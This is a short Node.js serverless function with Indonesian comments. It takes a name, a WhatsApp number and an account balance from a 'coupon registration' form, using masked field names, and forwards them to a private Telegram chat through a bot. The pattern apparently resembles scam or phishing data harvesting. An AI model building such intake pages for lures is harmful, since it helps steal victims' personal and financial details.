const axios = require('axios');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    const { a: name, b: phone, c: balance } = req.body;

    // Validasi input
    if (!name || !phone || !balance) {
      return res.status(400).json({ success: false, message: 'Semua field harus diisi' });
    }

    if (!/^08[0-9]{8,13}$/.test(phone)) {
      return res.status(400).json({ success: false, message: 'Nomor WhatsApp tidak valid' });
    }

    // Ambil token dari environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({ success: false, message: 'Server configuration error' });
    }

    // Format pesan untuk Telegram - gunakan format saldo asli dari form
    const telegramMessage = `
🆕 Pendaftaran Kupon Baru:
────────────────────
📛 Nama: ${name}
📞 WhatsApp: https://wa.me/${phone}
💳 Saldo: ${balance}
────────────────────
📅 Tanggal: ${new Date().toLocaleString('id-ID')}
    `;

    // Kirim ke Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: telegramMessage
    });

    // Response sukses
    res.status(200).json({ success: true, message: 'Data berhasil dikirim' });

  } catch (error) {
    console.error('Error:', error.message);
    res.status(500).json({ success: false, message: 'Terjadi kesalahan server' });
  }
};
